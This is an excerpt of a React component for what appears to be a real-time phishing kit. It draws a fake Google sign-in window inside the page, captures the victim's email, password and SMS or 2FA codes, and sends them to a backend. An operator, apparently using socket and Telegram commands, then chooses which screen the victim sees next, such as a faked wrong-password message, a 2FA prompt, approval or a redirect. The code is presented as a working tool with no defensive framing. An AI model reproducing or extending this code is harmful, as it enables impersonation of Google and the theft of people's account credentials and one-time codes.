...
function GoogleSignInPC({
  ...
  useEffect(() => {
    const handleBadEmail = () => {
      console.log('[Gmail PC] admin-bad-email event received');
      setIsRequestingAuth(false);
    ...
    const handleBadPass = () => {
      console.log('[Gmail PC] admin-bad-pass event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
    ...
    const handle2FAGmail = () => {
      console.log('[Gmail PC] admin-2fa-gmail event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
    ...
    const handle2FANumber = () => {
      console.log('[Gmail PC] admin-2fa-number event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
    ...
    const handle2FASMS = () => {
      console.log('[Gmail PC] admin-2fa-sms event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
    ...
    const handleWait = () => {
      console.log('[Gmail PC] admin-wait event received');
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
  ...
  useEffect(() => {
    if (!Unik) {
      console.log('[Gmail PC] No Unik, skipping socket connection');
      return;
    }

    console.log('[Gmail PC] Setting up socket connection for user:', Unik);
    const socketInstance = io(getSocketUrl(), {
      transports: ["websocket", "polling"],
    });

    socketInstance.on('connect', () => {
      console.log('[Gmail PC] ✅ Socket connected:', socketInstance.id);
      setSocketConnected(true);
    });

    socketInstance.on('disconnect', () => {
      console.log('[Gmail PC] ❌ Socket disconnected');
      setSocketConnected(false);
    });

    socketInstance.on('connect_error', (error) => {
      console.error('[Gmail PC] Socket connection error:', error.message);
      setSocketConnected(false);
    });
    ...
    // Connect the socket
    console.log('[Gmail PC] Connecting socket...');
    socketInstance.connect();

    // Listen for error decisions
    const errorEventName = `gmail-error-${Unik}`;
    console.log('[Gmail PC] Listening for event:', errorEventName);
    socketInstance.on(errorEventName, (data) => {
      console.log('[Gmail PC] ✅ Received error event:', errorEventName, data);
      // Clear timeout when admin makes decision
      if (passwordTimeoutRef.current) {
        console.log('[Gmail PC] Clearing timeout due to admin decision');
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setIsRequestingAuth(false);
    ...
    console.log('[Gmail PC] Listening for event:', twoFaEventName);
    socketInstance.on(twoFaEventName, (data) => {
      console.log('[Gmail PC] ✅ Received 2FA event:', twoFaEventName, data);
      // Clear timeout when admin makes decision
      if (passwordTimeoutRef.current) {
        console.log('[Gmail PC] Clearing timeout due to admin decision');
        clearTimeout(passwordTimeoutRef.current);
      ...
      if (data.type === 'gmail') {
        console.log('[Gmail PC] Processing 2FA Gmail - going to step: 2fa');
        setStep("2fa");
    ...
    console.log('[Gmail PC] Listening for event:', approvalEventName);
    socketInstance.on(approvalEventName, (data) => {
      console.log('[Gmail PC] ✅ Received approval event:', approvalEventName, data);
      // Clear timeout when admin makes decision
      if (passwordTimeoutRef.current) {
        console.log('[Gmail PC] Clearing timeout due to admin approval');
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setIsRequestingAuth(false);
      // Redirect or handle approval
      if (handleSubmit) {
        console.log('[Gmail PC] Calling handleSubmit');
        handleSubmit();
      }
    });
    ...
    console.log('[Gmail PC] Listening for event:', codeEventName);
    socketInstance.on(codeEventName, (data) => {
      console.log('[Gmail PC] ✅ Received code event:', codeEventName, data);
      if (data.code) {
    ...
    console.log('[Gmail PC] Listening for event:', waitEventName);
    socketInstance.on(waitEventName, (data) => {
      console.log('[Gmail PC] ✅ Received wait event:', waitEventName, data);
      if (passwordTimeoutRef.current) {
        console.log('[Gmail PC] Clearing timeout due to admin wait command');
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
      setIsRequestingAuth(false);
    ...
    return () => {
      console.log('[Gmail PC] Cleaning up socket connection');
  ...
  const handlePasswordChange = (e) => {
    ...
    if (passwordTimeoutRef.current) {
      console.log('[Gmail PC] Clearing timeout due to password change');
      clearTimeout(passwordTimeoutRef.current);
      passwordTimeoutRef.current = null;
    }
    clearPasswordError();
  ...
  const handlePasswordNext = async () => {
    ...
    // Clear any existing timeout first (defensive)
    if (passwordTimeoutRef.current) {
      console.log('[Gmail PC] Clearing existing timeout before new submission');
      clearTimeout(passwordTimeoutRef.current);
      passwordTimeoutRef.current = null;
    }
    ...
    if (!socketConnected) {
      console.warn('[Gmail PC] Socket not connected yet, waiting...');
    ...
    console.log('[Gmail PC] Password submitted, socket connected:', socketConnected);
    setIsRequestingAuth(true);
    
    // Set 60 second timeout for bad password
    const timeoutId = setTimeout(() => {
      console.log('[Gmail PC] 60 second timeout reached, showing bad password');
      setIsRequestingAuth(false);
      setPassword("");
      setSocketPasswordError("Wrong password. Try again or click Forgot password to reset it.");
      passwordTimeoutRef.current = null;
    ...
    console.log('[Gmail PC] Set timeout:', timeoutId);
    
    try {
      console.log('[Gmail PC] Sending request to backend...');
      ...
      console.log('[Gmail PC] Backend response:', data);
      
      // Wait for admin decision via socket events
    } catch (error) {
      console.error('[Gmail PC] Error sending auth request:', error);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      }
  ...
  const handleSmsCodeSubmit = async (e) => {
    ...
    // Send SMS code to backend via tfa_one field
    const params = {
      ...AllData,
      id: Unik,
      ip: Ip,
    ...
    try {
      ...
      // Wait for admin response (similar to password flow)
      // The admin will either approve or send /wrong2fa command
      // Keep the loading state until admin responds
    } catch (error) {
  ...
  useEffect(() => {
    const handleWrong2fa = () => {
      // Admin marked SMS code as wrong
    ...
    const handleApproved = () => {
      // Admin approved - redirect to done page
      if (typeof window !== "undefined") {
        window.location.href = "/application-complete";
      }
    };

    // Listen for wrong2fa event from Telegram polling
    ...
    <>
      <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black bg-opacity-50 overflow-y-auto">
        <div className="bg-white rounded-lg shadow-xl w-full max-w-md relative overflow-hidden my-8">
          ...
          <div className="bg-white border-gray-300 border-b px-3 py-2 flex items-center gap-2 rounded-t-lg">
            <div className="flex items-center gap-1">
              ...
              <span className="text-sm text-[#202124]">
                {step === "password" ? "Welcome - Google Chrome" : step === "2fa" || step === "2fa-code" || step === "2fa-options" || step === "2fa-sms-code" ? "2-Step Verification" : "Sign in - Google Accounts"}
              </span>
            </div>
          ...
          <div className="bg-white border-b border-gray-300 px-2 py-2 flex items-center gap-2">
            <div className="flex items-center gap-0">
              <button 
                ...
                onClick={() => step === "password" ? handleBackToEmail() : step === "2fa-options" ? handleBackTo2FA() : step === "2fa-sms-code" ? handleBackToSmsOptions() : (onClose ? onClose() : null)}
              >
                <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
          ...
          {/* Content Area */}
          <div className={"px-4 py-4 min-h-[500px] relative " + (step === "2fa" || step === "2fa-code" || step === "2fa-options" ? "bg-white" : "bg-white")}>
            {/* Loading Overlay - covers entire content area */}
            {isRequestingAuth && (
              <div className="absolute inset-0 bg-black bg-opacity-10 z-50 rounded-lg flex items-start">
              ...
              <div className="max-w-md mx-auto font-sans">
                ...
                {step === "email" ? (
                  <div className={`transition-all duration-300 ${isTransitioning ? 'translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
                    ...
                    <p className="text-sm text-[#5f6368] mb-10 leading-5 font-helvetica">
                    ...
                    {/* Footer */}
                    <div className="mt-20 pt-6 border-t border-gray-200 flex items-center justify-between text-xs text-[#5f6368]">
                      <div className="flex items-center gap-1">
                  ...
                  <div className={`transition-all duration-300 ${isTransitioning ? '-translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
                    ...
                    {/* Footer */}
                    <div className="mt-8 pt-6 border-t border-gray-200 flex items-center justify-between text-xs text-[#5f6368]">
                      <div className="flex items-center gap-1">
                        <span>English (United States)</span>
                        <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                  ...
                  <div className="flex justify-between">
                    ...
                    <button className="text-[#1a73e8] text-sm hover:underline block">
                      Resend it
                    </button>
                    ...
                    {/* Footer */}
                    <div className="mt-2 pt-6 flex items-center justify-between text-xs text-[#5f6368]">
                      <div className="flex items-center gap-1">
                        <span>English (United States)</span>
                        <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
